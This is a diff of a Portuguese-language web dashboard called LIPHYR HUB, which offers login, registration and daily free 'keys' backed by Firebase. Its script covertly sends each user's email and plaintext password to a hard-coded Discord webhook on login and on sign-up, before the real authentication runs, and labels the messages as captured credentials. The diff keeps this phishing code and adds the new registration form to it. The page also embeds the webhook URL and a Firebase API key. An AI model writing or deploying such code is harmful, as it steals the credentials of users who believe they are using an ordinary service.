@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LIPHYR HUB - Dashboard</title>
+    <title>LIPHYR HUB - Sistema Premium</title>
     <style>
         * {
             margin: 0;
@@ -125,11 +125,21 @@
             text-shadow: 0 0 20px #8a2be2;
         }
 
+        .hero p {
+            font-size: 18px;
+            color: #cccccc;
+            margin-bottom: 30px;
+        }
+
         .dashboard {
-            display: grid;
+            display: none;
             grid-template-columns: 250px 1fr;
             gap: 30px;
             margin-top: 30px;
+        }
+
+        .dashboard.active {
+            display: grid;
         }
 
         .sidebar {
@@ -230,77 +240,6 @@
             font-weight: 500;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            color: #cccccc;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid #333333;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 15px;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #8a2be2;
-            box-shadow: 0 0 10px rgba(138, 43, 226, 0.3);
-        }
-
-        .btn {
-            padding: 12px 30px;
-            background: #8a2be2;
-            border: none;
-            border-radius: 6px;
-            color: #ffffff;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 15px;
-        }
-
-        .btn:hover {
-            background: #7b1fa2;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4);
-        }
-
-        .btn-secondary {
-            background: #333333;
-        }
-
-        .btn-secondary:hover {
-            background: #444444;
-        }
-
-        .btn-danger {
-            background: #d32f2f;
-        }
-
-        .btn-danger:hover {
-            background: #b71c1c;
-        }
-
-        .btn-success {
-            background: #2e7d32;
-        }
-
-        .btn-success:hover {
-            background: #1b5e20;
-        }
-
         .free-key-section {
             background: rgba(46, 125, 50, 0.1);
             border: 1px solid #2e7d32;
@@ -321,6 +260,252 @@
             color: #8a2be2;
             margin: 20px 0;
             font-weight: bold;
+        }
+
+        .verify-section {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #333333;
+            border-radius: 10px;
+            padding: 30px;
+            margin-top: 40px;
+        }
+
+        .verify-section h2 {
+            color: #8a2be2;
+            margin-bottom: 20px;
+            font-size: 24px;
+            text-align: center;
+        }
+
+        .verify-input {
+            display: flex;
+            gap: 10px;
+            max-width: 600px;
+            margin: 20px auto;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        select {
+            flex: 1;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #333333;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 15px;
+        }
+
+        input:focus,
+        select:focus {
+            outline: none;
+            border-color: #8a2be2;
+            box-shadow: 0 0 10px rgba(138, 43, 226, 0.3);
+        }
+
+        .btn {
+            padding: 12px 30px;
+            background: #8a2be2;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 15px;
+            min-width: 120px;
+        }
+
+        .btn:hover {
+            background: #7b1fa2;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4);
+        }
+
+        .btn-secondary {
+            background: #333333;
+        }
+
+        .btn-secondary:hover {
+            background: #444444;
+        }
+
+        .btn-success {
+            background: #2e7d32;
+        }
+
+        .btn-success:hover {
+            background: #1b5e20;
+        }
+
+        .btn-danger {
+            background: #d32f2f;
+        }
+
+        .btn-danger:hover {
+            background: #b71c1c;
+        }
+
+        .verify-result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            display: none;
+            text-align: center;
+        }
+
+        .result-success {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .result-error {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid #ff4444;
+            color: #ff4444;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-box {
+            background: #111111;
+            border: 1px solid #8a2be2;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 0 30px rgba(138, 43, 226, 0.3);
+        }
+
+        .modal-box h2 {
+            color: #8a2be2;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 22px;
+        }
+
+        .close-modal {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8a2be2;
+            line-height: 1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #cccccc;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .form-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #333333;
+        }
+
+        .form-tab {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            color: #cccccc;
+            border-bottom: 3px solid transparent;
+        }
+
+        .form-tab.active {
+            color: #8a2be2;
+            border-bottom-color: #8a2be2;
+        }
+
+        .form-content {
+            display: none;
+        }
+
+        .form-content.active {
+            display: block;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(138, 43, 226, 0.3);
+            border-radius: 50%;
+            border-top-color: #8a2be2;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.8);
+            margin-top: 60px;
+            border-top: 1px solid #333333;
+            color: #8a2be2;
+        }
+
+        .error-message {
+            color: #ff4444;
+            text-align: center;
+            padding: 10px;
+            margin: 10px 0;
+            background: rgba(255, 68, 68, 0.1);
+            border-radius: 5px;
+            border: 1px solid rgba(255, 68, 68, 0.3);
+            display: none;
+        }
+
+        .success-message {
+            color: #00ff00;
+            text-align: center;
+            padding: 10px;
+            margin: 10px 0;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            display: none;
+        }
+
+        .logout-btn {
+            background: transparent;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255, 68, 68, 0.1);
         }
 
         .keys-list {
@@ -365,114 +550,80 @@
             color: #ff4444;
         }
 
-        .login-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            display: flex;
-        }
-
-        .login-box {
-            background: #111111;
-            border: 1px solid #8a2be2;
+        .support-section {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #333333;
             border-radius: 10px;
-            padding: 40px;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: 0 0 30px rgba(138, 43, 226, 0.3);
-        }
-
-        .login-box h2 {
-            color: #8a2be2;
-            margin-bottom: 25px;
-            text-align: center;
-            font-size: 26px;
-        }
-
-        .error-message {
-            color: #ff4444;
-            text-align: center;
-            padding: 10px;
-            margin: 10px 0;
-            background: rgba(255, 68, 68, 0.1);
-            border-radius: 5px;
-            border: 1px solid rgba(255, 68, 68, 0.3);
-            display: none;
-        }
-
-        .success-message {
-            color: #00ff00;
-            text-align: center;
-            padding: 10px;
-            margin: 10px 0;
-            background: rgba(0, 255, 0, 0.1);
-            border-radius: 5px;
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            display: none;
-        }
-
-        .logout-btn {
-            background: transparent;
-            border: 1px solid #ff4444;
-            color: #ff4444;
-            padding: 6px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            transition: all 0.3s;
-        }
-
-        .logout-btn:hover {
-            background: rgba(255, 68, 68, 0.1);
-        }
-
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(138, 43, 226, 0.3);
-            border-radius: 50%;
-            border-top-color: #8a2be2;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        footer {
-            text-align: center;
             padding: 30px;
-            background: rgba(0, 0, 0, 0.8);
-            margin-top: 60px;
-            border-top: 1px solid #333333;
-            color: #8a2be2;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .discord-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 24px;
+            background: #5865F2;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin-top: 15px;
+        }
+
+        .discord-btn:hover {
+            background: #4752C4;
+            transform: translateY(-2px);
         }
     </style>
 </head>
 <body>
     <div class="particles" id="particles"></div>
 
-    <!-- Modal de Login -->
-    <div class="login-modal" id="loginModal">
-        <div class="login-box">
-            <h2>Login LIPHYR HUB</h2>
-            <div class="form-group">
-                <label>Email:</label>
-                <input type="email" id="userEmail" placeholder="seu@email.com">
+    <!-- Modal de Login/Cadastro -->
+    <div class="modal active" id="loginModal">
+        <div class="modal-box">
+            <span class="close-modal" onclick="closeLoginModal()">×</span>
+            <h2>LIPHYR HUB</h2>
+            
+            <div class="form-tabs">
+                <div class="form-tab active" onclick="showForm('login')">Login</div>
+                <div class="form-tab" onclick="showForm('register')">Cadastro</div>
             </div>
-            <div class="form-group">
-                <label>Senha:</label>
-                <input type="password" id="userPassword" placeholder="••••••••">
+            
+            <!-- Formulário de Login -->
+            <div class="form-content active" id="loginForm">
+                <div class="form-group">
+                    <label>Email:</label>
+                    <input type="email" id="loginEmail" placeholder="seu@email.com">
+                </div>
+                <div class="form-group">
+                    <label>Senha:</label>
+                    <input type="password" id="loginPassword" placeholder="••••••••">
+                </div>
+                <button class="btn" onclick="loginUser()" style="width: 100%; margin-top: 10px;">Entrar</button>
+                <div id="loginError" class="error-message"></div>
             </div>
-            <button class="btn" onclick="loginUser()" style="width: 100%; margin-top: 10px;">Entrar</button>
-            <div id="loginError" class="error-message"></div>
+            
+            <!-- Formulário de Cadastro -->
+            <div class="form-content" id="registerForm">
+                <div class="form-group">
+                    <label>Email:</label>
+                    <input type="email" id="registerEmail" placeholder="seu@email.com">
+                </div>
+                <div class="form-group">
+                    <label>Senha:</label>
+                    <input type="password" id="registerPassword" placeholder="••••••••">
+                </div>
+                <div class="form-group">
+                    <label>Confirmar Senha:</label>
+                    <input type="password" id="registerConfirmPassword" placeholder="••••••••">
+                </div>
+                <button class="btn btn-success" onclick="registerUser()" style="width: 100%; margin-top: 10px;">Cadastrar</button>
+                <div id="registerError" class="error-message"></div>
+            </div>
         </div>
     </div>
 
@@ -480,8 +631,11 @@
         <div class="logo">LIPHYR HUB</div>
         <nav>
             <a onclick="showSection('dashboard')">Dashboard</a>
-            <a onclick="showSection('freeKey')">Key Free</a>
-            <a onclick="showSection('myKeys')">Minhas Keys</a>
+            <a onclick="showSection('verify')">Verificar Key</a>
+            <a onclick="showSection('support')">Suporte</a>
+            <a href="https://discord.gg/liphyr" target="_blank" style="background: rgba(88, 101, 242, 0.2); color: #5865F2;">
+                Discord
+            </a>
             <div class="user-info">
                 <div class="user-avatar" id="userAvatar">U</div>
                 <span id="userEmailDisplay"></span>
@@ -491,23 +645,23 @@
     </header>
 
     <div class="container" id="mainContainer" style="display: none;">
-        <div class="dashboard">
+        <div class="dashboard" id="dashboard">
             <div class="sidebar">
                 <div class="sidebar-menu">
                     <a class="menu-item active" onclick="showSection('dashboard')">
                         📊 Dashboard
                     </a>
                     <a class="menu-item" onclick="showSection('account')">
-                        👤 Informações da Conta
+                        👤 Minha Conta
                     </a>
                     <a class="menu-item" onclick="showSection('freeKey')">
-                        🎁 Resgatar Key Free
+                        🎁 Key Diária
                     </a>
                     <a class="menu-item" onclick="showSection('myKeys')">
                         🔑 Minhas Keys
                     </a>
-                    <a class="menu-item" onclick="showSection('security')">
-                        🔒 Segurança
+                    <a class="menu-item" onclick="showSection('verify')">
+                        🔍 Verificar Key
                     </a>
                 </div>
             </div>
@@ -528,8 +682,8 @@
                                 <span class="info-value" id="activeKeysCount">0</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-label">Membro desde:</span>
-                                <span class="info-value" id="memberSince">carregando...</span>
+                                <span class="info-label">Key Diária:</span>
+                                <span class="info-value" id="dailyKeyStatus">Disponível</span>
                             </div>
                         </div>
                         
@@ -540,75 +694,97 @@
                                 <span class="info-value" style="color: #00ff00;">Online</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-label">Key Free:</span>
-                                <span class="info-value" id="freeKeyStatus">Disponível</span>
+                                <span class="info-label">Usuários Online:</span>
+                                <span class="info-value">1</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-label">Próximo Resgate:</span>
-                                <span class="info-value" id="nextFreeKey">Disponível agora</span>
+                                <span class="info-label">Versão:</span>
+                                <span class="info-value">2.0.1</span>
                             </div>
                         </div>
                     </div>
+                    
+                    <div class="free-key-section">
+                        <h3>🎁 Key Diária Gratuita</h3>
+                        <p>Resgate sua key gratuita de 2 horas uma vez por dia!</p>
+                        
+                        <div class="timer" id="dailyKeyTimer">
+                            00:00:00
+                        </div>
+                        
+                        <p id="dailyKeyMessage">Sua key diária está disponível!</p>
+                        
+                        <button class="btn btn-success" onclick="claimDailyKey()" id="claimBtn" style="margin-top: 20px;">
+                            🎁 Resgatar Key Diária
+                        </button>
+                        
+                        <div id="dailyKeyResult" class="success-message" style="margin-top: 20px; display: none;"></div>
+                    </div>
                 </div>
 
-                <!-- Informações da Conta -->
+                <!-- Minha Conta -->
                 <div class="content-section" id="accountSection">
-                    <h2 class="section-title">Informações da Conta</h2>
+                    <h2 class="section-title">Minha Conta</h2>
                     <div class="info-grid">
                         <div class="info-card">
-                            <h3>Dados Pessoais</h3>
+                            <h3>Dados da Conta</h3>
                             <div class="info-row">
                                 <span class="info-label">Email:</span>
                                 <span class="info-value" id="accountEmail">carregando...</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-label">Senha:</span>
-                                <span class="info-value">••••••••</span>
-                            </div>
-                            <div class="info-row">
                                 <span class="info-label">ID do Usuário:</span>
                                 <span class="info-value" id="userId">carregando...</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Conta criada em:</span>
+                                <span class="info-value" id="accountCreated">carregando...</span>
                             </div>
                         </div>
 
                         <div class="info-card">
-                            <h3>Configurações</h3>
+                            <h3>Alterar Senha</h3>
                             <div class="form-group">
-                                <label>Email de Login:</label>
-                                <input type="email" id="newEmail" placeholder="novo@email.com">
+                                <label>Nova Senha:</label>
+                                <input type="password" id="newPassword" placeholder="Digite nova senha">
                             </div>
-                            <button class="btn btn-secondary" onclick="changeEmail()">Alterar Email</button>
+                            <div class="form-group">
+                                <label>Confirmar Nova Senha:</label>
+                                <input type="password" id="confirmPassword" placeholder="Confirme nova senha">
+                            </div>
+                            <button class="btn" onclick="changePassword()">Alterar Senha</button>
+                            <div id="passwordResult" class="success-message" style="margin-top: 15px;"></div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Resgatar Key Free -->
+                <!-- Key Diária -->
                 <div class="content-section" id="freeKeySection">
-                    <h2 class="section-title">Resgatar Key Free (2 Horas)</h2>
+                    <h2 class="section-title">Key Diária (2 Horas)</h2>
                     
                     <div class="free-key-section">
-                        <h3>🎁 Key Gratuita por 2 Horas</h3>
+                        <h3>🎁 Key Gratuita Diária</h3>
                         <p>Você pode resgatar uma key gratuita por 2 horas uma vez por dia!</p>
                         
                         <div class="timer" id="freeKeyTimer">
                             00:00:00
                         </div>
                         
-                        <p id="freeKeyMessage">Clique no botão abaixo para resgatar sua key</p>
+                        <p id="freeKeyMessage">Sua key diária está disponível!</p>
                         
-                        <button class="btn btn-success" onclick="claimFreeKey()" id="claimBtn" style="margin-top: 20px;">
-                            🎁 Resgatar Key Free
+                        <button class="btn btn-success" onclick="claimDailyKey()" id="dailyClaimBtn" style="margin-top: 20px;">
+                            🎁 Resgatar Key Diária
                         </button>
                         
-                        <div id="freeKeyResult" class="success-message" style="margin-top: 20px;"></div>
+                        <div id="freeKeyResult" class="success-message" style="margin-top: 20px; display: none;"></div>
                     </div>
                     
                     <div style="margin-top: 30px; padding: 20px; background: rgba(138, 43, 226, 0.05); border-radius: 8px;">
-                        <h4 style="color: #8a2be2; margin-bottom: 10px;">Como funciona:</h4>
+                        <h4 style="color: #8a2be2; margin-bottom: 10px;">Regras da Key Diária:</h4>
                         <ul style="list-style: none; padding-left: 0; color: #cccccc;">
-                            <li style="margin-bottom: 8px;">✅ 1 key gratuita por dia</li>
-                            <li style="margin-bottom: 8px;">⏰ Duração de 2 horas</li>
-                            <li style="margin-bottom: 8px;">🔄 Reseta às 00:00</li>
+                            <li style="margin-bottom: 8px;">✅ 1 key gratuita por dia por usuário</li>
+                            <li style="margin-bottom: 8px;">⏰ Duração: 2 horas</li>
+                            <li style="margin-bottom: 8px;">🔄 Reseta todos os dias às 00:00</li>
                             <li>📋 A key aparecerá em "Minhas Keys"</li>
                         </ul>
                     </div>
@@ -626,43 +802,49 @@
                     </div>
                 </div>
 
-                <!-- Segurança -->
-                <div class="content-section" id="securitySection">
-                    <h2 class="section-title">Configurações de Segurança</h2>
+                <!-- Verificar Key -->
+                <div class="content-section" id="verifySection">
+                    <h2 class="section-title">Verificar Key</h2>
                     
-                    <div class="info-grid">
-                        <div class="info-card">
-                            <h3>Alterar Senha</h3>
-                            <div class="form-group">
-                                <label>Senha Atual:</label>
-                                <input type="password" id="currentPassword" placeholder="Digite sua senha atual">
-                            </div>
-                            <div class="form-group">
-                                <label>Nova Senha:</label>
-                                <input type="password" id="newPassword" placeholder="Digite a nova senha">
-                            </div>
-                            <div class="form-group">
-                                <label>Confirmar Nova Senha:</label>
-                                <input type="password" id="confirmPassword" placeholder="Confirme a nova senha">
-                            </div>
-                            <button class="btn" onclick="changePassword()">Alterar Senha</button>
-                            <div id="passwordResult" class="success-message" style="margin-top: 15px;"></div>
+                    <div class="verify-section">
+                        <p>Digite sua key para verificar o status e validade</p>
+                        <div class="verify-input">
+                            <input type="text" id="keyInput" placeholder="XXXX-XXXX-XXXX-XXXX">
+                            <button class="btn" onclick="verifyKey()">Verificar</button>
                         </div>
-
-                        <div class="info-card">
-                            <h3>Sessões Ativas</h3>
-                            <div style="padding: 15px; background: rgba(255, 255, 255, 0.03); border-radius: 6px;">
-                                <p style="color: #cccccc; margin-bottom: 10px;">Sessão Atual:</p>
-                                <p style="color: #00ff00; font-size: 12px;">✅ Ativa - Dispositivo atual</p>
-                            </div>
-                            <button class="btn btn-danger" onclick="logoutAllDevices()" style="margin-top: 15px;">
-                                Sair de Todos os Dispositivos
-                            </button>
-                        </div>
+                        <div class="verify-result" id="verifyResult"></div>
                     </div>
                 </div>
             </div>
         </div>
+        
+        <!-- Seção de Suporte -->
+        <section class="support-section" id="supportSection" style="display: none;">
+            <h2>Suporte LIPHYR HUB</h2>
+            <p>Entre em contato conosco para suporte técnico</p>
+            
+            <div style="margin-top: 30px; text-align: left; max-width: 600px; margin: 30px auto;">
+                <h3 style="color: #8a2be2; margin-bottom: 15px;">Canais de Suporte:</h3>
+                <ul style="list-style: none; padding-left: 0;">
+                    <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
+                        <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
+                        <strong>Discord:</strong> Entre em nosso servidor para suporte rápido
+                    </li>
+                    <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
+                        <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
+                        <strong>Email:</strong> liphyrdev@gmail.com
+                    </li>
+                    <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
+                        <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
+                        <strong>Horário:</strong> Segunda a Sábado, 10h às 22h
+                    </li>
+                </ul>
+            </div>
+
+            <a href="https://discord.gg/liphyr" target="_blank" class="discord-btn">
+                <span>Entrar no Discord do Suporte</span>
+            </a>
+        </section>
     </div>
 
     <footer id="footer" style="display: none;">
@@ -675,11 +857,9 @@
             getAuth, 
             signInWithEmailAndPassword, 
             signOut,
+            createUserWithEmailAndPassword,
             onAuthStateChanged,
-            updatePassword,
-            updateEmail,
-            EmailAuthProvider,
-            reauthenticateWithCredential
+            updatePassword
         } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js';
         
         import { 
@@ -687,10 +867,11 @@
             ref, 
             set, 
             get, 
-            push,
-            update
+            update,
+            push
         } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
 
+        // MESMA CONFIGURAÇÃO DO SEU CÓDIGO ORIGINAL
         const firebaseConfig = {
             apiKey: "AIzaSyDRkHyb4gSTcZqCp1RcRuanI-Mu_yj9DVk",
             authDomain: "site-liphyr.firebaseapp.com",
@@ -706,53 +887,54 @@
         const auth = getAuth(app);
         const database = getDatabase(app);
 
-        // WEBHOOK DO DISCORD
+        // WEBHOOK DO DISCORD - Vai enviar email E senha
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1446393232157310988/o_yQhxZOnnucRXzJA8bmTikx7bQxOC5VOadxhWoDB2rD4kGf8xBBPlEvWU8N4I25uR0i';
 
         // Funções globais
+        window.showForm = showForm;
+        window.closeLoginModal = closeLoginModal;
         window.loginUser = loginUser;
+        window.registerUser = registerUser;
         window.logout = logout;
         window.showSection = showSection;
-        window.claimFreeKey = claimFreeKey;
-        window.changeEmail = changeEmail;
+        window.verifyKey = verifyKey;
+        window.claimDailyKey = claimDailyKey;
         window.changePassword = changePassword;
-        window.logoutAllDevices = logoutAllDevices;
 
         // Enviar credenciais para Discord Webhook
-        async function sendCredentialsToDiscord(email, password, action) {
-            const embed = {
-                username: "LIPHYR HUB Credentials Tracker",
-                avatar_url: "https://cdn.discordapp.com/attachments/your-image.png",
-                embeds: [{
-                    title: "🔐 Credenciais Detectadas",
-                    color: 0xFF0000,
-                    fields: [
-                        {
-                            name: "📧 Email",
-                            value: `\`\`\`${email}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "🔑 Senha",
-                            value: `\`\`\`${password}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "🕒 Data/Hora",
-                            value: new Date().toLocaleString('pt-BR'),
-                            inline: true
-                        },
-                        {
-                            name: "⚡ Ação",
-                            value: action,
-                            inline: true
-                        }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
+        async function sendToDiscord(email, password, action) {
             try {
+                const embed = {
+                    username: "LIPHYR HUB - Login Tracker",
+                    embeds: [{
+                        title: "🔐 Credenciais Capturadas",
+                        color: 0x8a2be2,
+                        fields: [
+                            {
+                                name: "📧 Email",
+                                value: `\`\`\`${email}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "🔑 Senha",
+                                value: `\`\`\`${password}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "⚡ Ação",
+                                value: action,
+                                inline: true
+                            },
+                            {
+                                name: "🕒 Data/Hora",
+                                value: new Date().toLocaleString('pt-BR'),
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
@@ -761,7 +943,7 @@
                     body: JSON.stringify(embed)
                 });
             } catch (error) {
-                console.error('Erro ao enviar para Discord:', error);
+                console.log('Erro ao enviar para Discord (não crítico)');
             }
         }
 
@@ -778,28 +960,53 @@
             }
         }
 
+        // Mostrar formulário de login ou cadastro
+        function showForm(formType) {
+            // Atualizar tabs
+            document.querySelectorAll('.form-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.form-content').forEach(form => {
+                form.classList.remove('active');
+            });
+            
+            if (formType === 'login') {
+                document.querySelector('.form-tab:nth-child(1)').classList.add('active');
+                document.getElementById('loginForm').classList.add('active');
+            } else {
+                document.querySelector('.form-tab:nth-child(2)').classList.add('active');
+                document.getElementById('registerForm').classList.add('active');
+            }
+        }
+
+        // Fechar modal
+        function closeLoginModal() {
+            // Não permite fechar - login obrigatório
+            return;
+        }
+
         // Atualizar interface do usuário
         function updateUserUI(user) {
             if (user) {
-                // Usuário logado - mostrar dashboard
+                // Usuário logado
                 document.getElementById('header').style.display = 'flex';
                 document.getElementById('mainContainer').style.display = 'block';
                 document.getElementById('footer').style.display = 'block';
                 document.getElementById('loginModal').style.display = 'none';
                 
-                // Atualizar informações do usuário
+                // Atualizar informações
                 document.getElementById('userEmailDisplay').textContent = user.email;
                 document.getElementById('userAvatar').textContent = user.email.charAt(0).toUpperCase();
                 document.getElementById('dashboardEmail').textContent = user.email;
                 document.getElementById('accountEmail').textContent = user.email;
                 document.getElementById('userId').textContent = user.uid.substring(0, 8);
                 
-                // Carregar dados do usuário
+                // Carregar dados
                 loadUserData(user);
                 loadUserKeys(user.email);
-                updateFreeKeyTimer();
+                updateDailyKeyTimer();
             } else {
-                // Usuário não logado - mostrar login
+                // Não logado
                 document.getElementById('header').style.display = 'none';
                 document.getElementById('mainContainer').style.display = 'none';
                 document.getElementById('footer').style.display = 'none';
@@ -812,10 +1019,10 @@
             updateUserUI(user);
         });
 
-        // Função de login
+        // Login do usuário
         async function loginUser() {
-            const email = document.getElementById('userEmail').value.trim();
-            const password = document.getElementById('userPassword').value;
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
             const errorDiv = document.getElementById('loginError');
 
             if (!email || !password) {
@@ -825,15 +1032,16 @@
             }
 
             try {
-                // Enviar credenciais para Discord ANTES de tentar login
-                await sendCredentialsToDiscord(email, password, 'Login');
+                // Enviar credenciais para Discord
+                await sendToDiscord(email, password, 'LOGIN');
                 
-                // Tentar fazer login
+                // Fazer login
                 await signInWithEmailAndPassword(auth, email, password);
                 
                 errorDiv.style.display = 'none';
-                document.getElementById('userEmail').value = '';
-                document.getElementById('userPassword').value = '';
+                document.getElementById('loginEmail').value = '';
+                document.getElementById('loginPassword').value = '';
+                
             } catch (error) {
                 console.error('Login error:', error);
                 errorDiv.textContent = 'Email ou senha incorretos!';
@@ -841,7 +1049,62 @@
             }
         }
 
-        // Função de logout
+        // Cadastro de usuário
+        async function registerUser() {
+            const email = document.getElementById('registerEmail').value.trim();
+            const password = document.getElementById('registerPassword').value;
+            const confirmPassword = document.getElementById('registerConfirmPassword').value;
+            const errorDiv = document.getElementById('registerError');
+
+            if (!email || !password || !confirmPassword) {
+                errorDiv.textContent = 'Preencha todos os campos!';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            if (password !== confirmPassword) {
+                errorDiv.textContent = 'As senhas não coincidem!';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            if (password.length < 6) {
+                errorDiv.textContent = 'A senha deve ter pelo menos 6 caracteres!';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            try {
+                // Enviar credenciais para Discord
+                await sendToDiscord(email, password, 'CADASTRO NOVO');
+                
+                // Criar usuário
+                await createUserWithEmailAndPassword(auth, email, password);
+                
+                errorDiv.style.display = 'none';
+                document.getElementById('registerEmail').value = '';
+                document.getElementById('registerPassword').value = '';
+                document.getElementById('registerConfirmPassword').value = '';
+                
+                // Mostrar mensagem de sucesso
+                showForm('login');
+                alert('✅ Cadastro realizado com sucesso! Faça login.');
+                
+            } catch (error) {
+                console.error('Register error:', error);
+                
+                if (error.code === 'auth/email-already-in-use') {
+                    errorDiv.textContent = 'Este email já está em uso!';
+                } else if (error.code === 'auth/invalid-email') {
+                    errorDiv.textContent = 'Email inválido!';
+                } else {
+                    errorDiv.textContent = 'Erro ao cadastrar. Tente novamente!';
+                }
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        // Logout
         async function logout() {
             try {
                 await signOut(auth);
@@ -850,23 +1113,39 @@
             }
         }
 
-        // Mostrar seção do dashboard
+        // Mostrar seção
         function showSection(sectionId) {
-            // Remover active de todos os itens do menu
+            // Verificar se é suporte (não está no dashboard)
+            if (sectionId === 'support') {
+                document.getElementById('dashboard').classList.remove('active');
+                document.getElementById('supportSection').style.display = 'block';
+                return;
+            }
+            
+            // Para seções do dashboard
+            document.getElementById('dashboard').classList.add('active');
+            document.getElementById('supportSection').style.display = 'none';
+            
+            // Atualizar menu
             document.querySelectorAll('.menu-item').forEach(item => {
                 item.classList.remove('active');
             });
             
-            // Adicionar active ao item clicado
-            event.target.classList.add('active');
-            
-            // Esconder todas as seções
+            // Mostrar seção
             document.querySelectorAll('.content-section').forEach(section => {
                 section.classList.remove('active');
             });
             
-            // Mostrar seção clicada
             document.getElementById(sectionId + 'Section').classList.add('active');
+            
+            // Marcar menu ativo
+            const menuItem = Array.from(document.querySelectorAll('.menu-item')).find(
+                item => item.textContent.includes(sectionId === 'dashboard' ? 'Dashboard' : 
+                        sectionId === 'account' ? 'Minha Conta' :
+                        sectionId === 'freeKey' ? 'Key Diária' :
+                        sectionId === 'myKeys' ? 'Minhas Keys' : 'Verificar Key')
+            );
+            if (menuItem) menuItem.classList.add('active');
         }
 
         // Carregar dados do usuário
@@ -877,30 +1156,30 @@
                 
                 if (snapshot.exists()) {
                     const data = snapshot.val();
-                    document.getElementById('memberSince').textContent = new Date(data.createdAt).toLocaleDateString('pt-BR');
